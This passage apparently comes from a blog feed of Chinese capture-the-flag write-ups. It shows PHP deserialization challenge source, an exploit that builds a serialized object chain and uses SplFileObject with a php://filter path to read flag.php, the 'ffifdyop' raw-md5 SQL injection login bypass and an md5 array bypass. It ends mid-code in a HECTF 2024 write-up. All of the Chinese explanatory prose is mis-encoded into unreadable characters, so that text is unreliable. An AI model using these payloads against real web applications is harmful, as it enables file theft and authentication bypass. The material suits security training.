class="variable">$rank</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$leader</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hahaha</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$department</span>,<span class="variable">$ceo</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">IPO</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;department-&gt;<span class="title function_ invoke__">hahaha</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">IPO</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ç®€å•çš„ PHP ååºåˆ—åŒ–ï¼Œä¸è¿‡éœ€è¦ç»“åˆåŸç”Ÿç±»å»è¯»å–æ–‡ä»¶ï¼Œå› ä¸º <code>school</code>  ç±»ä¸­çš„ <code>IPO</code>  æ–¹æ³•å­˜åœ¨å¯ä»¥æ§åˆ¶çš„è‡ªå®šä¹‰ new çš„å¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥æƒ³åˆ°çš„æ˜¯ç”¨ <code>SplFileObject</code>  åŸç”Ÿç±»æ¥è¯»å–æ–‡ä»¶ï¼Œåˆšå¥½å­˜åœ¨ echo å¯ä»¥è¾“å‡ºï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="string">&#x27;department&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="keyword">new</span> teacher;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="keyword">new</span> classroom;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> school;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//POSTï¼š</span></span><br><span class="line"><span class="comment">//a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020easy_md5"><a class="markdownIt-Anchor" href="#bjdctf-2020easy_md5">#</a> [BJDCTF 2020]easy_md5ï¼š</h3><p>â€‹è¿™ä¸ªè€ƒç‚¹æœ‰ç‚¹æ„æ€ï¼Œéœ€è¦ç‰¹åˆ«å…³æ³¨ä¸‹ï¼Œæ‰“å¼€ç½‘é¡µä¹‹åæ˜¯ä¸€ä¸ªæœç´¢æ¡†ï¼ŒæŠ“åŒ…çœ‹å“åº”å¤´å‘ç°äº†ä¸€ä¸ª hintï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5(<span class="built_in">$</span>pass,true)</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå‡ºç°äº†è¿™ä¸ªè€ƒç‚¹ï¼Œ <code>md5($pass,true)</code>  çš„ç»•è¿‡æ–¹å¼ï¼Œç…§ä¾‹æ¥è¯´ï¼Œè¿™é‡ŒçŒœæµ‹æ˜¯ä¸‡èƒ½å¯†ç ï¼Œéœ€è¦ md5 åŠ å¯†ä¹‹åæ‰”åˆ° MySQL æŸ¥è¯¢æ—¶å€™å¾—åˆ°çš„æ˜¯ <code>'or'[å‚æ•°]'</code>  è¿™ç§ç±»å‹çš„ç»“æœï¼Œæ‰€ä»¥ï¼Œé—®äº†ä¸‹ AIï¼ŒAi ç»™å‡ºäº†æ­£ç¡®ç­”æ¡ˆï¼Œå°±æ˜¯  <code>ffifdyop</code> ï¼Œè¿™é‡Œç»è¿‡åŠ å¯†åå¾—åˆ°çš„æ˜¯ï¼š <code>'or'6\xbb\xd9\x83\x1a\xe8\xd2\x1d\xc3\xe5\x8e\x8a</code>  çš„ 16 è¿›åˆ¶æ•°ï¼ŒMySQL é‡ŒæŸ¥è¯¢æ˜¯åƒä¸Šé¢æ•°æ®ä¸€æ ·ï¼Œä¹Ÿå°±æˆåŠŸæ‰§è¡Œäº†æ³¨å…¥äº†ã€‚</p><p>â€‹ä¸‹ä¸€æ­¥ï¼Œè·³è½¬è¿›äº†ä¸‹ä¸€ä¸ªé¡µé¢ä¹‹åï¼Œç›´æ¥è¯»å–æºä»£ç ï¼Œçœ‹åˆ°äº†æç¤ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: levell14.php&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹ç›´æ¥è®¿é—® <code>levell14.php</code>  æ–‡ä»¶ï¼Œå¾—åˆ°æœ€åä¸€æ­¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç›´æ¥æ•°ç»„ç»•è¿‡ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1<span class="built_in">&amp;</span>param2[]=2</span><br></pre></td></tr></table></figure><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwnï¼š</h2>]]></content>
      
      
      <categories>
          
          <category> å‘ç”µæ—¥å¸¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€2024ã€‘HECTF-ä¸ªäººæ•´ç†å‘</title>
      <link href="/posts/de34fe7b.html"/>
      <url>/posts/de34fe7b.html</url>
      
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><a href="#wp">WPï¼š</a><ul><li><a href="#web">Webï¼š</a><ul><li><a href="#are-you-happy">Are you happy?ï¼š</a></li><li><a href="#baby_unserialize">baby_unserializeï¼š</a></li><li><a href="#baby_sql">baby_sqlï¼š</a><ul><li><a href="#%E9%9D%9E%E9%A2%84%E6%9C%9F">éé¢„æœŸï¼š</a></li><li><a href="#%E9%A2%84%E6%9C%9F%E8%A7%A3">é¢„æœŸè§£</a></li></ul></li><li><a href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99">ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™ï¼š</a></li><li><a href="#ezweb">ezweb</a></li><li><a href="#ezjava">ezjavaï¼š</a></li></ul></li><li><a href="#misc">Miscï¼š</a><ul><li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85">ç®€å•çš„å‹ç¼©åŒ…ï¼š</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#sign-in">sign in</a></li><li><a href="#find-eggy">find eggyï¼š</a></li><li><a href="#arcaea_sorting">Arcaea_Sortingï¼š</a></li><li><a href="#arcaea_sorting_revenge">Arcaea_Sorting_Revengeï¼š</a></li></ul></li><li><a href="#re">Reï¼š</a><ul><li><a href="#babyre">babyreï¼š</a></li></ul></li><li><a href="#crypto">Cryptoï¼š</a><ul><li><a href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89">è¿·èŒ«çš„è‰¾ç±³è‰</a></li><li><a href="#seven-more">seven more</a></li><li><a href="#%E7%BF%BB%E4%B8%80%E7%BF%BB">ç¿»ä¸€ç¿»ï¼š</a></li><li><a href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF">ä¸åˆæ ¼çš„é­”è¯ï¼š</a></li><li><a href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6">æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦</a></li></ul></li></ul></li><li><a href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%E8%AE%B0%E5%BD%95">é¢˜ç›®æè¿°è®°å½•ï¼š</a><ul><li><a href="#web-2">Webï¼š</a><ul><li><a href="#are-u-happy"><strong>Are u happy</strong></a></li><li><a href="#baby_sql-2"><strong>baby_sql</strong></a></li><li><a href="#baby_unserialize-2"><strong>baby_unserialize</strong></a></li><li><a href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99-2"><strong>ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™</strong></a></li><li><a href="#ezweb-2"><strong>ezweb</strong></a></li><li><a href="#ezjava-2">ezjava</a></li></ul></li><li><a href="#re-2">Re</a><ul><li><a href="#babyre-2"><strong>babyre</strong></a></li><li><a href="#littleasm"><strong>littleasm</strong></a></li><li><a href="#pepy"><strong>PE?py?</strong></a></li><li><a href="#easyree"><strong>easyree</strong></a></li><li><a href="#ezandroid"><strong>ezAndroid</strong></a></li></ul></li><li><a href="#pwn-2">Pwn</a><ul><li><a href="#sign-in-2"><strong>sign in</strong></a></li><li><a href="#find-eggy-2"><strong>find eggy</strong></a></li><li><a href="#arcaea_sorting-2"><strong>Arcaea_Sorting</strong></a></li><li><a href="#arcaea_sorting_revenge-2"><strong>Arcaea_Sorting_Revenge</strong></a></li><li><a href="#%E5%96%B5%E5%96%B5%E5%96%B5"><strong>å–µå–µå–µ</strong></a></li><li><a href="#lip"><strong>lip</strong></a></li></ul></li><li><a href="#crypto-2">Crypto</a><ul><li><a href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89-2"><strong>è¿·èŒ«çš„è‰¾ç±³è‰</strong></a></li><li><a href="#%E7%BF%BB%E4%B8%80%E7%BF%BB-2"><strong>ç¿»ä¸€ç¿»</strong></a></li><li><a href="#seven-more-2"><strong>seven more</strong></a></li><li><a href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6-2"><strong>æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦</strong></a></li><li><a href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF-2"><strong>ä¸åˆæ ¼çš„é­”è¯</strong></a></li></ul></li><li><a href="#misc-2">Misc</a><ul><li><a href="#rem_you"><strong>Rem_You</strong></a></li><li><a href="#funny"><strong>funny</strong></a></li><li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-2"><strong>ç®€å•çš„å‹ç¼©åŒ…</strong></a></li><li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E4%BB%93%E5%BA%93"><strong>æ¶åŠ¿åŠ›çš„ä»“åº“</strong></a></li><li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95"><strong>æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•</strong></a></li><li><a href="#baby_unserialize-3"><strong>baby_unserialize</strong></a></li><li><a href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99-3"><strong>ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™</strong></a></li><li><a href="#ezweb-3"><strong>ezweb</strong></a></li><li><a href="#ezjava-3">ezjava</a></li></ul></li><li><a href="#re-3">Re</a><ul><li><a href="#babyre-3"><strong>babyre</strong></a></li><li><a href="#littleasm-2"><strong>littleasm</strong></a></li><li><a href="#pepy-2"><strong>PE?py?</strong></a></li><li><a href="#easyree-2"><strong>easyree</strong></a></li><li><a href="#ezandroid-2"><strong>ezAndroid</strong></a></li></ul></li><li><a href="#pwn-3">Pwn</a><ul><li><a href="#sign-in-3"><strong>sign in</strong></a></li><li><a href="#find-eggy-3"><strong>find eggy</strong></a></li><li><a href="#arcaea_sorting-3"><strong>Arcaea_Sorting</strong></a></li><li><a href="#arcaea_sorting_revenge-3"><strong>Arcaea_Sorting_Revenge</strong></a></li><li><a href="#%E5%96%B5%E5%96%B5%E5%96%B5-2"><strong>å–µå–µå–µ</strong></a></li><li><a href="#lip-2"><strong>lip</strong></a></li></ul></li><li><a href="#crypto-3">Crypto</a><ul><li><a href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89-3"><strong>è¿·èŒ«çš„è‰¾ç±³è‰</strong></a></li><li><a href="#%E7%BF%BB%E4%B8%80%E7%BF%BB-3"><strong>ç¿»ä¸€ç¿»</strong></a></li><li><a href="#seven-more-3"><strong>seven more</strong></a></li><li><a href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6-3"><strong>æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦</strong></a></li><li><a href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF-3"><strong>ä¸åˆæ ¼çš„é­”è¯</strong></a></li></ul></li><li><a href="#misc-3">Misc</a><ul><li><a href="#rem_you-2"><strong>Rem_You</strong></a></li><li><a href="#funny-2"><strong>funny</strong></a></li><li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-3"><strong>ç®€å•çš„å‹ç¼©åŒ…</strong></a></li><li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E4%BB%93%E5%BA%93-2"><strong>æ¶åŠ¿åŠ›çš„ä»“åº“</strong></a></li><li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95-2"><strong>æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•</strong></a></li></ul></li></ul></li></ul>(è¿™é‡Œå†™ç›®å½•æ ‡é¢˜)<br> æœ¬æ¥æƒ³æ•´ç†ä¸‹æ‰€æœ‰çš„ wp çš„ï¼Œç»“æœæœ€åå‘ç°å¥½å¤šéƒ½ä¸ä¼šï¼Œåˆ«çš„ä¸ä¼šçš„æŠ„ wp çš„è¯ä¼¼ä¹ä¹Ÿå°±åªæœ‰æŠ„å¤§ä½¬ä»¬äº¤ä¸Šæ¥çš„ wpï¼Œä¸å¤§å¥½ï¼Œæ‰€ä»¥æœ€ååªå†™äº†éƒ¨åˆ† wpï¼Œå‰©ä¸‹ç­‰åˆ°å­¦é•¿ä»¬æŠŠå®˜æ–¹ wp ä¼ ä¸Šå»å†æ•´ç†ã€‚</p><h1 id="wp"><a class="markdownIt-Anchor" href="#wp">#</a> WPï¼š</h1><h2 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Webï¼š</h2><h3 id="are-you-happy"><a class="markdownIt-Anchor" href="#are-you-happy">#</a> Are you happy?ï¼š</h3><p>â€‹game.js é‡Œæ‰¾ï¼Œflag åœ¨é‡Œé¢ï¼Œæ ¹æ® flag çš„æ ¼å¼ï¼Œflag å¼€å¤´æ˜¯ HECTFï¼Œå°†è¿™ä¸ªå­—æ®µ base64 ç¼–ç ä¸‹ï¼Œç„¶åå°±å¯ä»¥æœç´¢äº†ã€‚</p><h3 id="baby_unserialize"><a class="markdownIt-Anchor" href="#baby_unserialize">#</a> baby_unserializeï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag in /flag&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;msg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;token === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class00</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$b</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class01</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$temp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cls</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;temp = <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="title function_ invoke__">func1</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;temp === <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cls-&gt;str1 = <span class="variable language_">$this</span>-&gt;str3;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">            <span 